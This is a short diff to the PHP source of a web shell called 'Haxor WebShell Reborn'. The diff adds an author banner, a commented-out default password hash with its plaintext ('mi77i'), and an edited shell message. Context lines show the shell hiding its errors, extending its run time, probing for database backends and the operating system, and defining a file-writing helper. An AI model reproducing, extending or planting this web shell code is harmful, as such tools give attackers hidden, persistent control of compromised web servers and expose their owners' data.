@@ -1,4 +1,10 @@
 <?php
+/*   __________________________________________________
+    |              Haxor WebShell Reborn               |  
+    |              Author: @willygoid                  |
+    |       GitHub: https://github.com/willygoid       |
+    |__________________________________________________|
+*/
 @error_reporting(E_ERROR);
 @ini_set('display_errors', 'Off');
 @ini_set('max_execution_time', 10000);
@@ -37,8 +43,10 @@ if (function_exists('sybase_close')) {
 if (function_exists('pg_close')) {
     $issql .= ' - PostgreSql';
 }
+
+// $password = 'fedfd99ceb18bc7787911ec5953cd857'; //Default Pass: mi77i
 $win = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
-$msg = 'HaxorID Shell (mi77ihaxor@gmail.com)';
+$msg = 'Haxor Shell (mi77ihaxor@gmail.com)'; //Copyright Do not Remove
 function filew($filename, $filedata, $filemode)
 {
     if (!is_writable($filename) && file_exists($filename)) {
